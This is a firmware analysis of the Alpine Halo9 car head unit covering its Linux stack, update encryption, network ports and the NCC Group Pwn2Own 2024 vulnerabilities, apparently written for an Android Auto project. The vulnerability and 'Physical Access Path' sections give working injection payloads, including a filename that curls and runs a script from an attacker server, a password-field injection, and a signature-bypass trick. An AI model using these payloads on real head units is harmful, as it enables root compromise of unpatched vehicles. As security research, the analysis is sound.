# Alpine Halo9 iLX-F509/F511 Firmware Analysis

> **Source:** Alpine Halo9 firmware v6.0.000, file `A.23.D0.05.00.01.00.pak` (1.13 GB)
> **Download:** `https://vault.alpine-usa.com/products/firmware/Update.zip`
> **Date:** 2023-05-19 (firmware creation date), analyzed 2026-02-23
> **Platform:** Neusoft NAGIVI Linux (embedded Linux IVI framework)
> **SoC:** Telechips TCC8034 "Dolphin+" automotive processor
> **eMMC:** SK Hynix H26M52208FPRA, 16GB eMMC5.1 (153-ball FBGA)
> **AA Connection Server:** `/usr/bin/aoa_con_server_proc` on port 30515
> **Pwn2Own Status:** Exploited at Pwn2Own Automotive 2024 by NCC Group (CVE-2024-23961, CVE-2024-23960)

This document covers the Alpine Halo9 platform architecture, firmware encryption scheme, and Android Auto-relevant details recovered from partial firmware extraction and cross-referencing with NCC Group's published Pwn2Own Automotive 2024 research. Unlike the older iLX-W650BT (bare-metal RTOS), the Halo9 runs full embedded Linux — a completely different generation of Alpine head unit.

**Firmware contents could not be fully decrypted.** The inner AES-128 encryption layer requires keys extracted from the device's `/usr/bin/updatemgr` binary, which is only available via physical hardware access. All information below comes from the unencrypted outer layer, the `collective_sign_info.dat` metadata, and NCC Group's public RomHack 2024 presentation.

---

## Platform Overview

### Hardware

| Component | Detail |
|-----------|--------|
| SoC | Telechips TCC8034 "Dolphin+" — ARM-based automotive application processor |
| eMMC | SK Hynix H26M52208FPRA — 16GB eMMC5.1, 153-ball FBGA |
| Display | 9-inch capacitive touchscreen (1280x720 native) |
| Connectivity | USB (AA/CarPlay), Bluetooth, WiFi, HDMI |
| Framebuffer | `/dev/fb1` (main display output) |
| Touch input | `/dev/input/touchscreen0` (Linux input subsystem) |

### Software Stack

| Component | Detail |
|-----------|--------|
| OS | Embedded Linux (Neusoft NAGIVI framework) |
| IVI Framework | `fiv45` systemd service — main HU application |
| Display Server | Weston (Wayland compositor) |
| Camera | `cameraapp` systemd service |
| Firmware Update | `/usr/bin/updatemgr` — handles USB updates, firmware decryption |
| AA Connection | `/usr/bin/aoa_con_server_proc` — Android Open Accessory / AA server |
| Signing Key | `/etc/gda_public.key` — RSA public key for firmware signature verification |

### Key Difference from iLX-W650BT

The older Alpine iLX-W650BT runs Google's "tamul" AAP SDK v1.4.1 on a bare-metal Toshiba RTOS. The Halo9 runs a full Linux system built by Neusoft, with separate processes for different functions. The AA implementation is likely a separate userspace process (`aoa_con_server_proc`) rather than a monolithic SDK linked into the main firmware, suggesting a more modular architecture closer to the Kenwood approach.

---

## Firmware Structure

### Outer Package

The firmware download (`Update.zip`) contains:
```
Update/
├── A.23.D0.05.00.01.00.pak     # 1.13 GB — ZipCrypto-encrypted archive
└── collective_sign_info.dat     # 824 bytes — signing/metadata envelope
```

### collective_sign_info.dat Structure

A 4-block metadata file (824 bytes total) with magic `88FF55AA`:

| Block # | Offset | Name | Size | Purpose |
|---------|--------|------|------|---------|
| 0 | 0x0000 | header | 0x0038 | Magic number + block table |
| 1 | 0x0038 | upd_pkg.sig | 0x0100 | RSA-SHA256 signature of the .pak file |
| 2 | 0x0138 | host_info.dat | 0x0100 | AES-128-CBC encrypted metadata (ZIP password, org, filename, date) |
| 3 | 0x0238 | pkg_info.sig | 0x0100 | RSA-SHA256 signature of host_info.dat |

### host_info.dat (Decrypted)

When decrypted with the AES-128 key from `updatemgr`, host_info.dat contains:

| Offset | Field | Value |
|--------|-------|-------|
| 0x000c | AES-128 IV | `30303030303030303030303030303030` (ASCII "0000000000000000") |
| 0x001c | Organization | `Neusoft-IVI` |
| 0x0038 | ZIP Password | `0123456789` |
| 0x0078 | Package Name | `A.23.D0.05.00.01.00.pak` |
| 0x00a8 | Creation Date | `2023-05-19` |
| 0x00fe | CRC-16-CCITT | `0x6749` |

### Inner Package Contents (ZipCrypto Layer)

The .pak file is a 7-Zip archive with ZipCrypto encryption (password: `0123456789`):

| File | Size | Description |
|------|------|-------------|
| versions.dat | small | Firmware version metadata (plaintext) |
| rootfs.dat | small | Rootfs reassembly manifest |
| rootfs.pak1–6 | ~1 GB total | Root filesystem (6 parts, AES-128 encrypted) |
| kernel.pak | AES-128 | Linux kernel image |
| boot.pak | AES-128 | Bootloader |
| a7kernel.pak | AES-128 | Secondary core kernel (ARM Cortex-A7?) |
| a7rootfs.pak | AES-128 | Secondary core rootfs |
| mcu.pak | AES-128 | MCU firmware |

### versions.dat

```
ALL_VERSION = 2350001.00
BOOT_VERSION = BL_A.23.D0.05.00.01.00
SOC_VERSION = SS_A.23.D0.05.00.01.00
MCU_VERSION = MS_A.23.D0.05.00.01.00
CAMERA_VERSION = CS_A.23.D0.05.00.01.00
```

### rootfs.dat

```
total count = 6
rootfs.pak1 size = 209715200
rootfs.pak2 size = 209715200
rootfs.pak3 size = 209715200
rootfs.pak4 size = 209715200
rootfs.pak5 size = 209715200
rootfs.pak6 size = 50585600
```

Total rootfs: ~1.1 GB, split into 200MB chunks for the 7-Zip archive.

---

## Two-Layer Encryption Scheme

Alpine uses a two-layer encryption scheme:

```
Layer 1 (Outer): ZipCrypto
  ├── Password: "0123456789" (hardcoded, stored encrypted in host_info.dat)
  ├── Crackable: YES — trivial password, also vulnerable to known-plaintext attacks
  └── Protects: The ZIP archive containing individual .pak files

Layer 2 (Inner): AES-128-CBC
  ├── Keys: 2x hardcoded AES-128 keys in /usr/bin/updatemgr on device eMMC
  ├── IV: All zeros (0x00000000000000000000000000000000)
  ├── Crackable: NO — without physical access to device or known keys
  └── Protects: kernel.pak, boot.pak, rootfs.pak1-6, a7kernel.pak, a7rootfs.pak, mcu.pak
```

All inner .pak files have **maximum entropy** (8.0000 bits/byte), confirming solid AES-128 encryption with no exploitable structure.

### Signature Verification

- RSA-SHA256 signatures using public key at `/etc/gda_public.key`
- **Bypassable** via `ForceUpdate.bin` file on USB root (CVE-2024-23960)
- When `ForceUpdate.bin` exists, `UPDM_wbIsForceUpdFileExist()` returns true and signature verification is skipped entirely
- ForceUpdate.bin content format: `CS=nSS=nMS=nBL=n` (version constraints)

---

## Network Services (from NCC Group Research)

Services discovered running on the Halo9 via port scanning:

| Port | Protocol | Process | Purpose |
|------|----------|---------|---------|
| 2086 | TCP | framework-service | Main IVI framework |
| 3490 | TCP | dlt-daemon | AUTOSAR Diagnostic Log and Trace |
| 5355 | TCP | systemd-resolved | DNS resolution (LLMNR) |
| **30515** | **TCP** | **aoa_con_server_proc** | **Android Open Accessory / Android Auto connection server** |
| 5353 | UDP | mdnsd | mDNS service discovery |

### aoa_con_server_proc (Port 30515)

This is the most interesting process for our purposes. The name suggests it handles the Android Open Accessory (AOA) protocol connection — the transport layer that sits below the Android Auto protocol. On USB-connected AA, AOA is used to establish the initial USB link before AAP takes over. Having this as a standalone daemon (rather than embedded in the main framework) aligns with a modular architecture where AA connectivity is a separate service.

---

## Vulnerability Details (Pwn2Own Automotive 2024)

NCC Group (Alex Plaskett & McCaulay Hudson) demonstrated two exploit chains at Pwn2Own Automotive 2024, winning $40,000 and "style points" for running DOOM on the head unit.

### CVE-2024-23961 — Command Injection in updatemgr

**Two injection vectors:**

#### Vector 1: "CarByShell" — USB Filename Injection
- `updatemgr` scans `RL00036A/` directory on USB for splash screen images
- Computes SHA-256 hash using shell command with unsanitized filename
- Characters `&`, `|`, `<`, `>`, `\` are blocked, but **semicolons work**
- Payload filename: `;eval 'curl -s 10.42.0.1';.h264`
- Downloads and executes shell script from attacker's web server
- Achieves `uid=0(root)` shell via telnetd

#### Vector 2: "BrokenPass" — ZIP Password Injection
- The ZIP password field in `host_info.dat` is passed unsanitized to a `snprintf` → `system()` call
- `UPDM_wemCmdUpdFSpeDecomp()` constructs: `7za e -y -p%s %s %s -o%s` with password from host_info.dat
- Attacker-crafted `collective_sign_info.dat` with injected password: `;cd "$(mount -l|grep a/s|cut -d' ' -f3)/d";./d;`
- Requires signature bypass (CVE-2024-23960) to load modified update

### CVE-2024-23960 — Signature Verification Bypass

- `ForceUpdate.bin` file on USB root skips `UPDM_wemPkgInfoFSignVerify()` entirely
- The filename "ForceUpdate.bin" is stored as an XOR-encrypted string in updatemgr, decoded at runtime
- No authentication or MAC on ForceUpdate.bin — mere existence of the file bypasses all checks

### Alpine's Response

Alpine conducted a Threat Assessment and Remediation Analysis (TARA) per ISO 21434 and classified the vulnerability as "Sharing the Risk." **They will not release a patch.** This means the firmware we downloaded still contains both vulnerabilities.

---

## Comparison with Other Alpine Platforms

| Feature | iLX-W650BT (2019) | Halo9 iLX-F509 (2023) |
|---------|-------------------|----------------------|
| OS | Bare-metal RTOS ("MISO" framework) | Embedded Linux (Neusoft NAGIVI) |
| SoC | Toshiba TMM9200 | Telechips TCC8034 "Dolphin+" |
| AA SDK | Google "tamul" AAP SDK v1.4.1 | Unknown (likely newer, in aoa_con_server_proc) |
| SSL | MatrixSSL 3.9.5 | Unknown (likely OpenSSL on Linux) |
| Encryption | None (firmware unencrypted) | Two-layer: ZipCrypto + AES-128-CBC |
| Update method | USB (simple .FIR file) | USB (.pak in .zip with signing envelope) |
| Modem connectivity | None | WiFi, possibly OTA updates |
| Also supports | Baidu CarLife, Apple CarPlay | Apple CarPlay, likely CarLife |

---

## Implications for OpenAuto Prodigy

### What We Learned

1. **Modular AA architecture** — The Halo9 runs `aoa_con_server_proc` as a standalone daemon on port 30515, separate from the main IVI framework (`fiv45`). This validates our approach of making the AA connection handler a distinct component.

2. **Port 30515 for AOA** — This is a specific, non-standard port. If we ever want to emulate or interop with similar head units, knowing this port assignment is useful.

3. **Dual-core architecture** — The separate `a7kernel.pak` and `a7rootfs.pak` suggest a secondary ARM Cortex-A7 core handling specific duties (possibly real-time audio/video processing or MCU communication). This is common in automotive SoCs.

4. **AUTOSAR DLT** — The `dlt-daemon` on port 3490 indicates the system uses AUTOSAR Diagnostic Log and Trace, a standard automotive logging protocol. This is useful context for understanding log formats if we ever get filesystem access.

5. **Neusoft-IVI as a platform** — Neusoft is a major Chinese automotive software company. Their NAGIVI platform appears in multiple Alpine models and possibly other brands. The iLX-W650BT used Allgo middleware for CarPlay; the Halo9 has moved to a fully Neusoft-controlled Linux stack.

6. **Alpine doesn't patch** — Both CVEs remain unpatched as of 2026. This is notable context for the automotive security landscape.

### What We Couldn't Extract

Without AES-128 decryption keys (requires physical access to dump `updatemgr` from eMMC):
- No access to rootfs (couldn't extract AA binaries, libraries, protobuf definitions)
- No access to kernel config or driver information
- No access to `aoa_con_server_proc` binary for protocol analysis
- No access to AA configuration files or capabilities XML

### Physical Access Path (If Available)

Two viable approaches exist if hardware access were available:

1. **CarByShell exploit** (software-only, USB drive required):
   - Create USB with `RL00036A/` directory containing injected filename
   - Trigger "Car by Car Update" from Settings → About → Software Update
   - Get root shell via telnetd, then dump `updatemgr` for AES keys
   - Decrypt firmware at leisure

2. **eMMC dump** (hardware, requires soldering):
   - eMMC stores data **unencrypted** — firmware only encrypted in transit
   - SD card sniffer on eMMC data lines, or dead-bug BGA reball
   - Direct filesystem access to all binaries and config

---

## Cross-Reference: NCC Group RomHack 2024 Presentation

**Title:** "Revving Up: The Journey to Pwn2Own Automotive 2024"
**Authors:** Alex Plaskett & McCaulay Hudson (NCC Group EDG)
**Event:** RomHack 2024
**Local copy:** `firmware/alpine-latest/romhack-ncc-alpine.pdf`

The presentation covers ~70 slides on Alpine Halo9, then transitions to the Phoenix Contact CHARX SEC-3100 EV charger (a separate Pwn2Own target, not relevant to AA). Key Alpine content:

| Slides | Topic |
|--------|-------|
| 1–10 | Pwn2Own Automotive overview, target selection |
| 11–20 | Hardware teardown, eMMC identification, board photos |
| 21–30 | CarByShell command injection (CVE-2024-23961 vector 1) |
| 31–40 | Firmware encryption deep-dive, collective_sign_info.dat structure |
| 41–55 | BrokenPass ZIP password injection + ForceUpdate.bin bypass |
| 56–60 | Exploit delivery via USB + head unit UI walkthrough |
| 61–68 | DOOM port to the head unit (framebuffer + touchscreen) |
| 69–70 | Pwn2Own demo video, Alpine's "no patch" response |

**AES keys were redacted** (black boxes over Ghidra screenshot on slide 36). NCC Group responsibly withheld the actual key values.

**NCC Group published Python tools** (referenced in slides but not publicly released):
- `alpine-decryptor.py` — Parses collective_sign_info.dat, decrypts host_info.dat, unzips, merges rootfs, decrypts AES layer
- `broken-pass.py` — Creates crafted collective_sign_info.dat with injected ZIP password for BrokenPass exploit
